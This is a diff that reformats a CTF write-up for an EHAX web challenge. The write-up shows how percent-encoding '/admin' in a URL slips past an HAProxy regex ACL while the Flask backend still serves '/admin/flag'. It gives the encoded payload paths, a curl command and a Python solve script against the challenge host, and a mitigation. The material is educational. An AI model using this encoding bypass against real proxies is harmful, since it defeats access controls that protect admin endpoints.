@@ -1,85 +1,40 @@
-<!-- # CTF Writeup: Borderline Personality
+# CTF Writeup: Borderline Personality
 
-ℹ️ Challenge Info
-* Event: [EHAX CTF]
-* Category: [Web]
-* Difficulty: [Easy]
+## ℹ️ Challenge Info
 
+* **Event:** EHAX CTF
+* **Category:** Web
+* **Difficulty:** Easy
+* **Description:** The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.
 
-## Description
-The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.
-### Summary
+---
 
+## Summary
 
-### Initial Discovery & Analysis
+This challenge demonstrates a classic **reverse proxy bypass** using URL encoding. The `/admin/flag` endpoint is blocked at the proxy layer using an ACL rule in HAProxy, but the backend (Flask app) still exposes it. By sending a URL-encoded version of `/admin/flag`, we bypass the proxy filter and directly access the flag.
 
-Code snippet
-```
+---
 
-```
+## Architecture Overview
 
+**User** $\rightarrow$ **HAProxy** (Port 8080) $\rightarrow$ **Flask Backend** (Port 5000)
 
-## Exploitation / Solution Path
+* **HAProxy** acts as a reverse proxy.
+* It blocks `/admin` using a regex ACL.
+* **Flask backend** still serves `/admin/flag`.
+* This creates a trust mismatch between proxy and backend.
 
-## Solve Script
+---
 
+## Initial Discovery & Analysis
 
-## Flag:
-CTF{th1s_is_th3_fl4g}
+We are given access to: `http://chall.ehax.in:9098/`
 
-```
-path: http://chall.ehax.in:9098/admin/flag: blocked
-path: http://chall.ehax.in:9098/%61%64%6d%69%6e/flag
-path: http://chall.ehax.in:9098/%61dmin/flag
-``` -->
+Trying to directly access `http://chall.ehax.in:9098/admin/flag` results in: **Blocked / Denied**
 
-CTF Writeup: Borderline Personality
+### 🔎 Looking at HAProxy Configuration
 
-ℹ️ Challenge Info
-
-Event: EHAX CTF
-
-Category: Web
-
-Difficulty: Easy
-
-Description
-
-The proxy thinks it's in control. The backend thinks it's safe. Find the space between their lies and slip through.
-
-Summary
-
-This challenge demonstrates a classic reverse proxy bypass using URL encoding.
-
-The /admin/flag endpoint is blocked at the proxy layer using an ACL rule in HAProxy, but the backend (Flask app) still exposes it.
-
-By sending a URL-encoded version of /admin/flag, we bypass the proxy filter and directly access the flag.
-
-Architecture Overview
-User → HAProxy (Port 8080) → Flask Backend (Port 5000)
-
-HAProxy acts as a reverse proxy
-
-It blocks /admin using a regex ACL
-
-Flask backend still serves /admin/flag
-
-This creates a trust mismatch between proxy and backend.
-
-Initial Discovery & Analysis
-
-We are given access to:
-
-http://chall.ehax.in:9098/
-
-Trying to directly access:
-
-http://chall.ehax.in:9098/admin/flag
-
-Results in:
-
-Blocked / Denied
-🔎 Looking at HAProxy Configuration
+```haproxy
 frontend http-in
     bind *:8080
     
@@ -87,152 +42,117 @@ frontend http-in
     http-request deny if restricted_path
     
     default_backend application_backend
-🚨 Important Line
-acl restricted_path path -m reg ^/+admin
 
-This means:
+```
 
-Match any path starting with /admin
+> [!IMPORTANT]
+> **🚨 Important Line:** `acl restricted_path path -m reg ^/+admin`
+> This means: Match any path starting with `/admin`. If matched $\rightarrow$ deny request.
 
-If matched → deny request
+### 🔎 Looking at Backend (Flask)
 
-So HAProxy blocks requests where the path starts with /admin.
-
-🔎 Looking at Backend (Flask)
+```python
 @app.route('/admin/flag', methods=['GET', 'POST'])
 def flag():
     return "EHAX{TEST_FLAG}\n", 200
 
-The backend does expose /admin/flag.
+```
 
-So the vulnerability is:
+The backend does expose `/admin/flag`. The vulnerability is that the proxy blocks based on **raw path matching**, but the backend processes **decoded paths**.
 
-The proxy blocks based on raw path matching, but the backend processes decoded paths.
+---
 
-Understanding the Vulnerability
-🔹 Reverse Proxy
+## Understanding the Vulnerability
 
-A reverse proxy sits in front of the backend server and filters requests before forwarding them.
+### 🔹 Reverse Proxy
 
-Here:
+A reverse proxy sits in front of the backend server and filters requests before forwarding them. Here, **HAProxy** is the gatekeeper using a regex to block `/admin`.
 
-HAProxy is the gatekeeper.
+### 🔹 URL Encoding
 
-It uses a regex to block /admin.
+URL encoding replaces characters with `%` followed by their ASCII hex value.
 
-🔹 URL Encoding
+* **admin** $\rightarrow$ `%61%64%6d%69%6e`
 
-URL encoding replaces characters with % followed by their ASCII hex value.
+### Why This Works
 
-Example:
+HAProxy checks the path **before** decoding.
 
-Character	ASCII	Encoded
-a	97	%61
-d	100	%64
-m	109	%6d
-i	105	%69
-n	110	%6e
+* `/admin/flag` $\rightarrow$ **Blocked**
+* `/%61%64%6d%69%6e/flag` $\rightarrow$ **NOT blocked** (The regex `^/+admin` does not match the literal string `%61...`)
 
-So:
+However, **Flask** automatically decodes the URL before routing. When `/%61%64%6d%69%6e/flag` reaches Flask, it becomes `/admin/flag`.
 
-admin → %61%64%6d%69%6e
-Why This Works
+**🔥 Result:** Proxy allows it, backend serves it. This is a classic **proxy normalization mismatch**.
 
-HAProxy checks the path before decoding.
+---
 
-So:
+## Exploitation / Solution Path
 
-/admin/flag      → Blocked
-/%61%64%6d%69%6e/flag → NOT blocked
+Try accessing the URL with the first character encoded:
+`http://chall.ehax.in:9098/%61dmin/flag`
 
-Because the regex ^/+admin does not match %61%64%6d%69%6e.
+**Working Payloads:**
 
-However…
+* **Path:** `/admin/flag` $\rightarrow$ Blocked
+* **Path:** `/%61%64%6d%69%6e/flag` $\rightarrow$ **Works**
+* **Path:** `/%61dmin/flag` $\rightarrow$ **Works**
 
-Flask automatically decodes the URL before routing.
+### Solve Script
 
-So:
+**Using curl:**
 
-/%61%64%6d%69%6e/flag
-
-Becomes:
-
-/admin/flag
-
-When it reaches Flask.
-
-🔥 Result → Proxy allows it, backend serves it.
-
-This is a classic proxy normalization mismatch vulnerability.
-
-Exploitation / Solution Path
-
-Try accessing:
-
-http://chall.ehax.in:9098/%61%64%6d%69%6e/flag
-
-or even partially encoded:
-
-http://chall.ehax.in:9098/%61dmin/flag
-
-Because:
-
-%61 = a
-
-Rest stays same
-
-HAProxy regex doesn't match
-
-Flask decodes correctly
-
-Working Payload
-path: http://chall.ehax.in:9098/admin/flag   → blocked
-path: http://chall.ehax.in:9098/%61%64%6d%69%6e/flag  → works
-path: http://chall.ehax.in:9098/%61dmin/flag → works
-Solve Script
-
-Using curl:
-
+```bash
 curl http://chall.ehax.in:9098/%61%64%6d%69%6e/flag
 
-Using Python:
+```
 
+**Using Python:**
+
+```python
 import requests
 
 url = "http://chall.ehax.in:9098/%61%64%6d%69%6e/flag"
 r = requests.get(url)
 print(r.text)
-Root Cause
 
-The vulnerability exists because:
+```
 
-HAProxy filters based on raw path.
+---
 
-Flask processes decoded path.
+## Root Cause & Mitigation
 
-No normalization consistency between proxy and backend.
+### Root Cause
 
-This is known as:
+The vulnerability exists because there is no normalization consistency between the proxy and backend.
 
-URL normalization bypass
+* URL normalization bypass
+* Reverse proxy bypass
+* Path encoding attack
 
-Reverse proxy bypass
+### How to Fix It
 
-Path encoding attack
+Proper mitigation involves normalizing the URL **before** applying ACL checks:
 
-How to Fix It (Defensive Insight)
-
-Proper mitigation:
-
-Normalize URL before applying ACL
-
-Use:
-
+```haproxy
 http-request set-path %[path,decode]
 
-before ACL checks
+```
 
-Or block after decoding
 
-Final Flag
-EHAX{TEST_FLAG}
+## 🎓 Educational Appendix: Things to Learn
+
+### 1. What is a Reverse Proxy?
+
+A **Reverse Proxy** is a server that sits between client devices and a backend web server. It accepts requests from clients and forwards them to the appropriate backend. It is often used for load balancing, SSL termination, and security filtering. In this challenge, **HAProxy** was used to filter out "unauthorized" requests.
+
+### 2. What is HAProxy?
+
+**HAProxy** is a high-performance, open-source load balancer and proxy server for TCP and HTTP-based applications. It uses **ACLs (Access Control Lists)** to define flexible rules for routing or blocking traffic based on headers, paths, or IP addresses.
+
+### 3. What is URL Encoding?
+
+**URL Encoding** (or Percent-encoding) is a mechanism for encoding information in a Uniform Resource Identifier (URI). Characters that are not allowed in a URL, or characters that have special meaning, are replaced with a `%` followed by two hexadecimal digits.
+
+* **Example:** The character `a` has a hex value of `61`, so it becomes `%61`.
+* **The Lesson:** Security filters must always decode inputs before inspecting them, otherwise, a simple encoding change can bypass the filter.
